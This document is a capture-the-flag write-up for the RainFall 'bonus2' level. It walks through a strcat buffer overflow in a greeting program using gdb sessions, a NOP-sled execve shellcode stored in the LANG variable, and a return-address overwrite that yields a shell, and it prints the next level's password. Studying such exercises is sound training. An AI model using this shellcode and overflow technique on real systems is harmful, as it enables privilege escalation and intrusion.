# Bonus 2

<h3>source.c</h3>

```console
int language = 0;

void greetuser(char *arg) {
	char str[72];

	if (language == 1) {
		strcpy(str, "Hyv\xc3\xa4\xc3\xa4 p\xc3\xa4iv\xc3\xa4\xc3\xa4 ");
	}
	else if (language == 2) {
		strcpy(str, "Goedemiddag! ");
	}
	else if (language == 0) {
		strcpy(str, "Hello ");
	}
	strcat(str, arg);
	puts(str);
}

int main(int ac, char **av) {
	char	str[76];
	char	*env = NULL;

	if (ac != 3) {
    return (1);
  }
	memset(str, 0, 19 * 4);
	strncpy(str, av[1], 40);
	strncpy(str + 40, av[2], 32);
	env = getenv("LANG");
	if (env != 0) {
		if (memcmp(env, "fi", 2) == 0) {
			lang = 1;
		}
    else if (memcmp(env, "nl", 2) == 0) {
			lang = 2;
		}
	}
	greetuser(str);
	return (0);
}
```

<h3>Analysis</h3>

In this program, there is no `system()` and it is protected by `ASLR`, so the only way to spawn a shell will be through `ShellCode`

Since there is some `strcpy()` we should be able to exploit the buffer overflow

The function do `strncpy()` of 40 bytes for `argv[1]` and 32 bytes for `argv[2]` so total will be around 72 bytes

Lets try to see if we could cause segfault with this amount of bytes

```console
(gdb) run $(python -c 'print "a" * 40') $(python -c 'print "b" * 32')

Starting program: /home/user/bonus2/bonus2 $(python -c 'print "a" * 40') $(python -c 'print "b" * 32')
Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb

Program received signal SIGSEGV, Segmentation fault.
0x08006262 in ?? ()
```

It seems that the `bb` is writen in the return address, but with only 2 bytes of overflow, we couldn't write any address on this

Lets try to check if we set the env `LANG` to either `fi` or `nl` since there concat greeting is longer than the default `hello`

```console
bonus2@RainFall:~$ export LANG=fi
bonus2@RainFall:~$ gdb -q bonus2
Reading symbols from /home/user/bonus2/bonus2...(no debugging symbols found)...done.
(gdb) run $(python -c 'print "a" * 40') $(python -c 'print "b" * 32')
Starting program: /home/user/bonus2/bonus2 $(python -c 'print "a" * 40') $(python -c 'print "b" * 32')
Hyvää päivää aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb

Program received signal SIGSEGV, Segmentation fault.
0x62626262 in ?? ()
```

Yes, it seems that if we set the `LANG` env to `fi` it will cause overflow and able to totally rewrite the return address, for sure `nl` could achieve the same as well

Our goal this time will be to overwrite the return address and point it to our `ShellCode` in the env

<h3>Exploit</h3>

First lets check the offset we need to overflow with `LANG = fi`

```console
(gdb) run $(python -c 'print "a" * 40') AAAABBBBCCCCDDDDEEEEFFFF

Starting program: /home/user/bonus2/bonus2 $(python -c 'print "a" * 40') AAAABBBBCCCCDDDDEEEEFFFF
Hyvää päivää aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaAAAABBBBCCCCDDDDEEEEFFFF

Program received signal SIGSEGV, Segmentation fault.
0x46464545 in ?? ()
(gdb)
```

From this we can see that the offset for `argv[2]` will be `18`

Next lets put our `ShellCode` together with the `LANG` env

```console
export LANG=`python -c "print 'fi' + '\x90' * 100 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'"`
```

Now we need to get the address for the `ShellCode`

```console
(gdb) break *0x08048630
Breakpoint 1 at 0x8048630
(gdb) run $(python -c 'print "a" * 40') AAAABBBBCCCCDDDDEEEEFFFF
Starting program: /home/user/bonus2/bonus2 $(python -c 'print "a" * 40') AAAABBBBCCCCDDDDEEEEFFFF
Hyvää päivää aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaAAAABBBBCCCCDDDDEEEEFFFF

Program received signal SIGSEGV, Segmentation fault.
0x46464545 in ?? ()
x/s *((char **)environ+11)
0xbffffe70:	 "LANG=fi\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343\211\301\211\302\260\v\315\200\061\300@\315\200"
(gdb) x/32wx 0xbffffe70
0xbffffe70:	0x474e414c	0x9069663d	0x90909090	0x90909090
0xbffffe80:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffe90:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffea0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffeb0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffec0:	0x90909090	0x90909090	0x90909090	0x90909090
```

From there we can choose any address that contain the `\x90`, and the `NOP slide` will bring us to the beginning of our `ShellCode`, example `0xbffffe80`

Now its time to build our payload and try it

```console
bonus2@RainFall:~$ ./bonus2 `python -c "print 'a' * 40"` `python -c "print 'b' * 18 + '\x80\xfe\xff\xbf'"`
Hyvää päivää aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbb����
$ whoami
bonus3
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```